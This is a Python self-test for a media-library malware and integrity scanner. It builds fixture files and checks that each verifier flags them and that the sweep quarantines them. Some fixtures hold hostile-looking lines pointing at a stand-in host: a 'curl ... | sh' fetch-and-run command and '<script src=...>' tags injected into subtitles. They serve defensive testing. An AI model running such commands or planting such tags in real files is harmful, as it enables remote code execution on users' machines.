#!/usr/bin/env python3

"""Prove every check still detects what it is meant to detect.

A scanner that cannot read the files it is handed reports all of them clean,
which looks exactly like a library with nothing wrong in it. `scan-clamav.sh`
already refuses to report a clean run until it has caught EICAR; this does the
same for the checks written here. Each one is run against a file that must be
flagged and a file that must not, and the verdicts are compared against the
quarantine list in sweep.sh so that a detection nothing acts on is a failure
too.

Fixtures are built in a temporary directory outside the library, so the watcher
never sees them and nothing here can touch real media.
"""

import argparse
import json
import os
import re
import shutil
import subprocess
import sys
import tempfile
import zipfile
from dataclasses import dataclass, field

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
SWEEP = os.path.join(SCRIPT_DIR, "sweep.sh")

EICAR = r"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"

# Long enough to clear MIN_DURATION_SECONDS, small enough to encode on a laptop
# that overheats.
DURATION = 61
VIDEO_SIZE = "640x360"
VIDEO_BITRATE = "300k"

# Larger in area than the frame, which is what a poster usually is and what
# made a correct h264 remux report itself as mjpeg.
COVER_SIZE = "800x1200"


@dataclass
class Case:
    """One fixture and the verdict it must produce.

    `expect` empty means the file must come back with no problems at all: the
    false positives are as much a part of the contract as the detections.
    """

    path: str
    check: str
    expect: tuple = ()
    quarantined: bool = True


CASES = (
    Case("clean/Fixture Clean - [Bluray-360p][AVC].mkv", "types"),
    Case("clean/Fixture Clean - [Bluray-360p][AVC].mkv", "media"),
    Case("clean/Fixture Clean.srt", "types"),
    Case("clean/Fixture Clean.srt", "subtitles"),

    Case("types/elf-as-movie.mkv", "types", ("EXECUTABLE", "MISMATCH")),
    Case("types/script-as-subtitles.srt", "types", ("SCRIPT",)),
    Case("types/archive-as-movie.mkv", "types", ("ARCHIVE", "MISMATCH")),
    Case("types/payload.exe", "types", ("DANGEROUS_NAME",)),
    Case("types/eicar.com", "types", ("DANGEROUS_NAME",)),

    Case("media/cover-art-only.mkv", "media", ("COVER_ART_ONLY",), quarantined=False),
    Case("media/audio-only.mkv", "media", ("NOT_VIDEO",)),
    Case("media/attachment-carrier.mkv", "media", ("ATTACHMENT",)),
    Case("media/unreadable.mkv", "media", ("UNREADABLE",), quarantined=False),
    Case("media/codec-lie x265.mkv", "media", ("CODEC",), quarantined=False),
    Case("media/resolution-lie 1080p.mkv", "media", ("RESOLUTION",), quarantined=False),
    Case("media/too-short.mkv", "media", ("SHORT",), quarantined=False),
    Case("media/no-audio.mkv", "media", ("NO_AUDIO",), quarantined=False),

    Case("subtitles/active-content.srt", "subtitles", ("ACTIVE_CONTENT",)),
    Case("subtitles/embedded-binary.ass", "subtitles", ("EMBEDDED",)),
    Case("subtitles/provider-error-page.srt", "subtitles", ("NOT_SUBTITLE",)),
    Case("subtitles/binary.srt", "subtitles", ("BINARY",)),
    Case("subtitles/no-cues.srt", "subtitles", ("NO_CUES",), quarantined=False),

    # What a container carries inside it. These verdicts are reported, not
    # quarantined: a new detection does not get to move files on the strength
    # of its first day in service.
    Case("clean/Fixture Clean - [Bluray-360p][AVC].mkv", "embedded"),
    Case("embedded/mime-lie.mkv", "embedded", ("MIME_LIE", "NOT_A_FONT"), quarantined=False),
    Case("embedded/appended-cover.mkv", "embedded", ("APPENDED_DATA",), quarantined=False),
    Case("embedded/active-subtitle.mkv", "embedded", ("ACTIVE_CONTENT",), quarantined=False),
)


@dataclass
class Result:
    passed: list = field(default_factory=list)
    failed: list = field(default_factory=list)
    skipped: list = field(default_factory=list)

    def record(self, ok, label, detail=""):
        if ok:
            self.passed.append(label)
        else:
            self.failed.append(f"{label}{detail and ': ' + detail}")
        return ok


def run(command, **kwargs):
    return subprocess.run(command, capture_output=True, text=True, check=False, **kwargs)


def ffmpeg(*arguments):
    completed = run(("ffmpeg", "-y", "-loglevel", "error", *arguments))
    if completed.returncode != 0:
        raise RuntimeError(f"ffmpeg failed: {completed.stderr.strip()[:400]}")


def encode(target, duration=DURATION, size=VIDEO_SIZE, codec="libx264", audio=True):
    arguments = ["-f", "lavfi", "-i", f"testsrc=size={size}:rate=10:duration={duration}"]
    if audio:
        arguments += ["-f", "lavfi", "-i", f"sine=frequency=440:duration={duration}", "-c:a", "aac"]
    arguments += ["-c:v", codec, "-preset", "ultrafast", "-b:v", VIDEO_BITRATE, "-pix_fmt", "yuv420p", target]
    ffmpeg(*arguments)


def build_fixtures(root):
    for name in ("clean", "types", "media", "subtitles", "deep", "embedded", "work"):
        os.makedirs(os.path.join(root, name), exist_ok=True)

    work = os.path.join(root, "work")
    cover = os.path.join(work, "cover.jpg")
    ffmpeg("-f", "lavfi", "-i", f"color=c=blue:s={COVER_SIZE}", "-frames:v", "1", cover)

    base = os.path.join(work, "base.mkv")
    encode(base)

    # The feature, with cover art bigger than the frame and an audio track:
    # everything a real remux has, and it must come back silent.
    clean = os.path.join(root, "clean", "Fixture Clean - [Bluray-360p][AVC].mkv")
    attach_cover(base, cover, clean)

    write(os.path.join(root, "clean", "Fixture Clean.srt"),
          "1\n00:00:01,000 --> 00:00:04,000\nA line of dialogue.\n\n"
          "2\n00:00:05,000 --> 00:00:08,000\nAnother one.\n")

    shutil.copy("/bin/true", os.path.join(root, "types", "elf-as-movie.mkv"))
    write(os.path.join(root, "types", "script-as-subtitles.srt"),
          "#!/bin/sh\ncurl -s http://example.invalid/payload | sh\n")
    with zipfile.ZipFile(os.path.join(root, "types", "archive-as-movie.mkv"), "w") as archive:
        archive.writestr("readme.txt", "not a film")
    write(os.path.join(root, "types", "payload.exe"), "MZ" + "\0" * 128)
    write(os.path.join(root, "types", "eicar.com"), EICAR)

    # Only stream is the poster, which is the shape a still image wearing a
    # .mkv name takes.
    audio_only = os.path.join(root, "media", "audio-only.mkv")
    ffmpeg("-f", "lavfi", "-i", f"sine=frequency=440:duration={DURATION}", "-c:a", "aac", audio_only)
    attach_cover(audio_only, cover, os.path.join(root, "media", "cover-art-only.mkv"))

    ffmpeg("-i", base, "-attach", os.path.join(root, "types", "payload.exe"),
           "-metadata:s:t", "mimetype=application/octet-stream",
           "-metadata:s:t", "filename=payload.exe", "-c", "copy",
           os.path.join(root, "media", "attachment-carrier.mkv"))

    write(os.path.join(root, "media", "unreadable.mkv"), "not a container at all, just prose" * 64)

    # A header-only file that ffprobe still parses: the sweep reads headers, so
    # catching this is deep.sh's job, not verify-media.py's.
    with open(clean, "rb") as source, open(os.path.join(root, "deep", "truncated.mkv"), "wb") as target:
        target.write(source.read(65536))
    shutil.copy(clean, os.path.join(root, "deep", "intact.mkv"))
    shutil.copy(os.path.join(root, "media", "cover-art-only.mkv"), os.path.join(root, "deep", "cover-art-only.mkv"))

    shutil.copy(base, os.path.join(root, "media", "codec-lie x265.mkv"))
    encode(os.path.join(root, "media", "resolution-lie 1080p.mkv"), size="320x240")
    encode(os.path.join(root, "media", "too-short.mkv"), duration=5)
    encode(os.path.join(root, "media", "no-audio.mkv"), audio=False)

    write(os.path.join(root, "subtitles", "active-content.srt"),
          "1\n00:00:01,000 --> 00:00:04,000\n<script src=\"http://example.invalid/x.js\"></script>\n")
    write(os.path.join(root, "subtitles", "embedded-binary.ass"),
          "[Script Info]\nScriptType: v4.00+\n\n[Events]\n"
          "Format: Layer, Start, End, Text\n"
          "Dialogue: 0,0:00:01.00,0:00:04.00,A line\n\n"
          "[Fonts]\nfontname: payload.ttf\nM+NB`!\"!\n")
    write(os.path.join(root, "subtitles", "provider-error-page.srt"),
          "<!DOCTYPE html>\n<html><body>Daily download limit reached.</body></html>\n")
    write(os.path.join(root, "subtitles", "binary.srt"),
          "1\n00:00:01,000 --> 00:00:04,000\nA line\0with a NUL\n")
    write(os.path.join(root, "subtitles", "no-cues.srt"), "just some prose, no timings at all\n")

    # An attachment declaring itself a font over an ELF binary: the shape the
    # mimetype tag cannot be trusted about.
    liar = os.path.join(work, "payload.ttf")
    shutil.copy("/bin/true", liar)
    ffmpeg("-i", base, "-attach", liar,
           "-metadata:s:t", "mimetype=font/ttf", "-metadata:s:t", "filename=payload.ttf",
           "-c", "copy", os.path.join(root, "embedded", "mime-lie.mkv"))

    # A valid JPEG with a second payload bolted on after its end marker.
    appended = os.path.join(work, "appended.jpg")
    with open(cover, "rb") as source, open(appended, "wb") as target:
        target.write(source.read())
        target.write(b"MZ" + b"\x90" * 512)
    attach_cover(base, appended, os.path.join(root, "embedded", "appended-cover.mkv"))

    # Markup that can fetch or execute, inside the container rather than beside it.
    active = os.path.join(work, "active.ass")
    write(active,
          "[Script Info]\nScriptType: v4.00+\n\n"
          "[V4+ Styles]\n"
          "Format: Name, Fontname, Fontsize, PrimaryColour, SecondaryColour, OutlineColour, "
          "BackColour, Bold, Italic, Underline, StrikeOut, ScaleX, ScaleY, Spacing, Angle, "
          "BorderStyle, Outline, Shadow, Alignment, MarginL, MarginR, MarginV, Encoding\n"
          "Style: Default,Arial,20,&H00FFFFFF,&H000000FF,&H00000000,&H00000000,"
          "0,0,0,0,100,100,0,0,1,2,0,2,10,10,10,1\n\n"
          "[Events]\n"
          "Format: Layer, Start, End, Style, Name, MarginL, MarginR, MarginV, Effect, Text\n"
          "Dialogue: 0,0:00:01.00,0:00:04.00,Default,,0,0,0,,"
          "<script src=\"http://example.invalid/x.js\"></script>\n")
    ffmpeg("-i", base, "-i", active, "-map", "0", "-map", "1", "-c", "copy",
           os.path.join(root, "embedded", "active-subtitle.mkv"))

    shutil.rmtree(work)


def attach_cover(source, cover, target):
    """Add cover art the way Matroska carries it, as an attachment named cover.jpg.

    ffmpeg's matroska demuxer turns that attachment back into a video stream
    with attached_pic set, which is the shape the real remux had.
    """
    ffmpeg("-i", source, "-attach", cover,
           "-metadata:s:t", "mimetype=image/jpeg", "-metadata:s:t", "filename=cover.jpg",
           "-c", "copy", target)


def write(path, text):
    with open(path, "w", encoding="utf-8", newline="\n") as handle:
        handle.write(text)


def run_check(name, root, report_dir):
    """Run one verifier over the whole fixture tree, return path -> problems."""
    script = {"types": "verify-types.py", "media": "verify-media.py",
              "subtitles": "verify-subtitles.py", "embedded": "verify-embedded.py"}[name]
    report = os.path.join(report_dir, f"{name}.jsonl")
    extra = ("--no-clamav",) if name == "embedded" and not clamav_usable() else ()
    completed = run(("python3", os.path.join(SCRIPT_DIR, script), root, "--report", report,
                     "--quiet", *extra))
    if not os.path.exists(report):
        raise RuntimeError(f"{script} wrote no report: {completed.stderr.strip()[:400]}")

    findings = {}
    with open(report, encoding="utf-8") as handle:
        for line in handle:
            entry = json.loads(line)
            findings[os.path.normpath(entry["path"])] = entry.get("problems") or []
    return findings


def clamav_usable():
    """clamd is only reachable where it runs, and a scan it cannot do proves nothing."""
    if not shutil.which("clamdscan"):
        return False
    with tempfile.TemporaryDirectory() as directory:
        probe = os.path.join(directory, "eicar.com")
        write(probe, EICAR)
        os.chmod(probe, 0o644)
        return "FOUND" in run(("clamdscan", "--fdpass", "--no-summary", "--infected", probe)).stdout


def quarantine_verdicts():
    """The verdicts sweep.sh actually acts on."""
    with open(SWEEP, encoding="utf-8") as handle:
        return frozenset(re.findall(r"--problem\s+([A-Z_]+)", handle.read()))


def check_detections(root, report_dir, result):
    findings = {name: run_check(name, root, report_dir)
                for name in ("types", "media", "subtitles", "embedded")}
    acted_on = quarantine_verdicts()

    for case in CASES:
        path = os.path.normpath(os.path.join(root, case.path))
        label = f"{case.check:<9} {case.path}"
        problems = findings[case.check].get(path)

        if problems is None:
            result.record(False, label, "the check never inspected this file")
            continue

        verdicts = {p.split(":", 1)[0] for p in problems}

        if not case.expect:
            result.record(not problems, label + " [must stay clean]", "; ".join(problems))
            continue

        missing = [v for v in case.expect if v not in verdicts]
        if not result.record(not missing, label, f"missing {', '.join(missing)} (got {'; '.join(problems) or 'nothing'})"):
            continue

        if case.quarantined:
            result.record(bool(acted_on & set(case.expect)), label + " [sweep acts on it]",
                          f"none of {', '.join(case.expect)} is in sweep.sh's quarantine list")


def check_quarantine(root, result):
    """Prove the dry run moves nothing and that --apply follows every hardlink."""
    library = os.path.join(root, "library")
    quarantine = os.path.join(root, "quarantine")
    os.makedirs(os.path.join(library, "media"), exist_ok=True)
    os.makedirs(os.path.join(library, "torrents"), exist_ok=True)

    imported = os.path.join(library, "media", "flagged.mkv")
    seeding = os.path.join(library, "torrents", "flagged.mkv")
    write(imported, "payload")
    os.link(imported, seeding)

    report = os.path.join(root, "quarantine-input.jsonl")
    write(report, json.dumps({"path": imported, "problems": ["EXECUTABLE: content is application/x-dosexec"]}) + "\n")

    command = ("python3", os.path.join(SCRIPT_DIR, "quarantine.py"),
               "--root", library, "--quarantine", quarantine, "--scan-root", library,
               "--from-jsonl", report, "--problem", "EXECUTABLE")

    dry = run(command)
    result.record("WOULD MOVE" in dry.stdout and os.path.exists(imported) and os.path.exists(seeding),
                  "quarantine dry run leaves both links in place", dry.stdout.strip()[:200])

    applied = run(command + ("--apply",))
    moved = os.path.join(quarantine, os.listdir(quarantine)[0]) if os.path.isdir(quarantine) else ""
    both_gone = not os.path.exists(imported) and not os.path.exists(seeding)
    manifest = os.path.join(moved, "manifest.jsonl") if moved else ""
    result.record(both_gone and os.path.exists(manifest),
                  "quarantine --apply moves every hardlink and writes a manifest",
                  applied.stdout.strip()[:200])

    if os.path.exists(manifest):
        with open(manifest, encoding="utf-8") as handle:
            record = json.loads(handle.readline())
        result.record(len(record.get("links", [])) == 2 and record.get("sha256"),
                      "manifest records both links and a digest", json.dumps(record)[:200])


def check_deep(root, report_dir, result):
    """deep.sh reads files through, so it must catch what a header check cannot."""
    report = os.path.join(report_dir, "deep.jsonl")
    completed = run(("python3", os.path.join(SCRIPT_DIR, "deep-verify.py"), os.path.join(root, "deep"),
                     "--report", report, "--fraction", "1", "--slice", "0", "--sample-seconds", "2"))
    if not os.path.exists(report):
        result.record(False, "deep  verification runs", completed.stderr.strip()[:200])
        return

    findings = {}
    with open(report, encoding="utf-8") as handle:
        for line in handle:
            entry = json.loads(line)
            findings[os.path.basename(entry["path"])] = entry.get("problems") or []

    result.record(bool(findings.get("truncated.mkv")), "deep      truncated.mkv",
                  "a truncated file read through must not come back clean")
    result.record(bool(findings.get("cover-art-only.mkv")), "deep      cover-art-only.mkv",
                  "decoding the cover art instead of a feature must not count as a pass")
    result.record(findings.get("intact.mkv") == [], "deep      intact.mkv [must stay clean]",
                  "; ".join(findings.get("intact.mkv") or ["never inspected"]))


def check_embedded_state(root, report_dir, result):
    """A budgeted run must resume, not restart.

    Sorted paths plus a time budget means that without remembered state every
    run re-reads the same alphabetical prefix and never reaches the rest.
    """
    def twice(directory, state_name):
        state = os.path.join(report_dir, state_name)
        command = ("python3", os.path.join(SCRIPT_DIR, "verify-embedded.py"),
                   os.path.join(root, directory), "--state", state, "--quiet")
        if not clamav_usable():
            command += ("--no-clamav",)
        return run(command), run(command)

    first, second = twice("clean", "embedded-state-clean.json")
    result.record("Inspected 1 container" in first.stdout,
                  "embedded  a clean container is inspected once", first.stdout.strip()[-200:])
    result.record("Skipped 1 container" in second.stdout and "Inspected 0 container" in second.stdout,
                  "embedded  and skipped while it has not changed", second.stdout.strip()[-200:])

    # A flagged container is deliberately not remembered: the report is rebuilt
    # from what each run inspected, so forgetting it would make the problem
    # disappear from the report after one pass.
    _, again = twice("embedded", "embedded-state-flagged.json")
    result.record("Inspected 3 container" in again.stdout and "Skipped" not in again.stdout,
                  "embedded  a flagged container is re-read every run", again.stdout.strip()[-200:])


def check_clamav(root, result):
    if not shutil.which("clamdscan"):
        result.skipped.append("clamav: clamdscan is not installed here")
        return

    eicar = os.path.join(root, "types", "eicar.com")
    completed = run(("clamdscan", "--fdpass", "--no-summary", "--infected", eicar))
    if completed.returncode > 1 or "Can't access file" in completed.stdout + completed.stderr:
        result.skipped.append(f"clamav: clamd unreachable or cannot read the fixture ({completed.stdout.strip()[:120]})")
        return

    result.record("FOUND" in completed.stdout, "clamav detects the EICAR test file",
                  completed.stdout.strip()[:200])


def main():
    parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("--keep", action="store_true", help="leave the fixtures in place for inspection")
    parser.add_argument("--fixtures", metavar="DIR", help="build fixtures here instead of a temporary directory")
    arguments = parser.parse_args()

    for command in ("ffmpeg", "ffprobe", "file"):
        if not shutil.which(command):
            print(f"Required command not found: {command}", file=sys.stderr)
            return 2

    root = arguments.fixtures or tempfile.mkdtemp(prefix="mediascan-selftest-")
    os.makedirs(root, exist_ok=True)
    reports = os.path.join(root, "reports")
    os.makedirs(reports, exist_ok=True)

    result = Result()
    try:
        print(f"Building fixtures in {root}")
        build_fixtures(root)
        check_detections(root, reports, result)
        check_deep(root, reports, result)
        check_embedded_state(root, reports, result)
        check_clamav(root, result)
        check_quarantine(root, result)
    finally:
        if arguments.keep or arguments.fixtures:
            print(f"Fixtures kept in {root}")
        else:
            shutil.rmtree(root, ignore_errors=True)

    print()
    for line in result.passed:
        print(f"pass {line}")
    for line in result.skipped:
        print(f"SKIP {line}")
    for line in result.failed:
        print(f"FAIL {line}")

    print(f"\n{len(result.passed)} passed, {len(result.failed)} failed, {len(result.skipped)} skipped.")
    if result.skipped:
        print("A skipped check proves nothing. Run this on the host where that engine lives.")
    return 1 if result.failed else 0


if __name__ == "__main__":
    sys.exit(main())
